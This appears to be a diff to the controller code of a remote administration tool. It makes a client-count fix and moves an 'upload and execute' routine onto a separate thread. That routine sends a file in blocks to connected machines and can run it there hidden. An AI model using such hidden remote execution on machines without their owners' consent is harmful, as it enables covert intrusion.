@@ -189,7 +189,6 @@ namespace xServer.Forms
                 int selectedClients = 0;
                 this.Invoke((MethodInvoker) delegate
                 {
-                    selectedClients = lstClients.SelectedItems.Count;
                     foreach (ListViewItem lvi in lstClients.Items)
                     {
                         if ((Client) lvi.Tag == client)
@@ -198,6 +197,7 @@ namespace xServer.Forms
                             server.ConnectedClients--;
                         }
                     }
+                    selectedClients = lstClients.SelectedItems.Count;
                 });
                 UpdateWindowTitle(ListenServer.ConnectedClients, selectedClients);
             }
@@ -481,32 +481,35 @@ namespace xServer.Forms
                     {
                         if (frm.ShowDialog() == DialogResult.OK)
                         {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            new Thread(() =>
                             {
-                                Client c = (Client)lvi.Tag;
-
-                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
-                                if (srcFile.MaxBlocks < 0)
+                                foreach (ListViewItem lvi in lstClients.SelectedItems)
                                 {
-                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError), "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                                    break;
-                                }
+                                    Client c = (Client)lvi.Tag;
 
-                                int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)
-
-                                CommandHandler.HandleStatus(c, new Core.Packets.ClientPackets.Status("Uploading file..."));
-
-                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
-                                {
-                                    byte[] block;
-                                    if (!srcFile.ReadBlock(currentBlock, out block))
+                                    FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
+                                    if (srcFile.MaxBlocks < 0)
                                     {
                                         MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError), "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                         break;
                                     }
-                                    new Core.Packets.ServerPackets.UploadAndExecute(ID, Path.GetFileName(UploadAndExecute.FilePath) , block, srcFile.MaxBlocks, currentBlock, UploadAndExecute.RunHidden).Execute(c);
+
+                                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)
+
+                                    CommandHandler.HandleStatus(c, new Core.Packets.ClientPackets.Status("Uploading file..."));
+
+                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                                    {
+                                        byte[] block;
+                                        if (!srcFile.ReadBlock(currentBlock, out block))
+                                        {
+                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError), "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                            break;
+                                        }
+                                        new Core.Packets.ServerPackets.UploadAndExecute(ID, Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks, currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                    }
                                 }
-                            }
+                            }).Start();
                         }
                     }
                 }
